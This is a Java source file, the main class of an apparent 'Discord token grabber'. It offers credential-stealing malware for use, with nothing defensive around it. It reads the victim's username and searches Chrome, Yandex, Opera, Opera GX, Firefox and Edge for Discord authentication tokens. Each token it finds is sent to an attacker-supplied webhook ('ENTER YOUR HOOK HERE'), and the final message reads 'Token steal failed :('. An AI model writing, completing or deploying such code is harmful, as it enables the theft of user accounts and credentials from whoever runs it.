package com.github.dedinc.discordtokengrabber;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import com.github.dedinc.discordtokengrabber.browsers.BrowserManager;
import com.github.dedinc.discordtokengrabber.utils.Handler;
import com.github.dedinc.discordtokengrabber.utils.Helper;

public class Main {
	
	public static String webhook = "ENTER YOUR HOOK HERE";
	public static String cd = System.getenv("systemDrive");
	public static String username = System.getenv("USERNAME");

	public static void main(String[] args)  {
		String browser = null;
		if (args.length > 0) {
			browser = args[0];
		}
		String token = "";
		Handler handler = Helper.getHander();
		handler.handle(browser);
		try {
			Helper.getDiscord().sendMessage("[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + username + "\n\nBrowsers: \n" + handler.getBrowsers());		
		   } catch (Exception e) {
		}
		if (handler.chr) {
			try {
				token = BrowserManager.getChrome().grab();
				if (token != null) {
					Helper.getDiscord().sendMessage(token);
					return;
				 }
				Helper.getDiscord().sendMessage("Chrome: Unauthorized in Discord!");
			   } catch (Exception e) {
			}
		}
		if (handler.yan) {
			try {
				token = BrowserManager.getYandex().grab();
				if (token != null) {
					Helper.getDiscord().sendMessage(token);
					return;
				 }
				Helper.getDiscord().sendMessage("Yandex: Unauthorized in Discord!");
			   } catch (Exception e) {
			}
		}
		if (handler.opr) {
			try {
				token = BrowserManager.getOpera().grab(false);
				if (token != null) {
					Helper.getDiscord().sendMessage(token);
					return;
				 }
				Helper.getDiscord().sendMessage("Opera: Unauthorized in Discord!");
			   } catch (Exception e) {
			}
		}
		if (handler.opr_gx) {
			try {
				token = BrowserManager.getOpera().grab(true);
				if (token != null) {
					Helper.getDiscord().sendMessage(token);
					return;
				 }
				Helper.getDiscord().sendMessage("Opera GX: Unauthorized in Discord!");
			   } catch (Exception e) {
			}
		}
		if (handler.frx) {
			try {
				token = BrowserManager.getFirefox().grab();
				if (token != null) {
					Helper.getDiscord().sendMessage(token);
					return;
				}
				Helper.getDiscord().sendMessage("Firefox: Unauthorized in Discord!");
			  } catch (Exception e) {
				  e.printStackTrace();
			}
		 }		
		if (handler.edg) {
			try {
				token = BrowserManager.getEdge().grab();
				if (token != null) {
					Helper.getDiscord().sendMessage(token);
					return;
				}
				Helper.getDiscord().sendMessage("Edge: Unauthorized in Discord!");
			  } catch (Exception e) {
			}
		}
		Helper.getDiscord().sendMessage("Token steal failed :(");
		System.exit(0);
	 }
}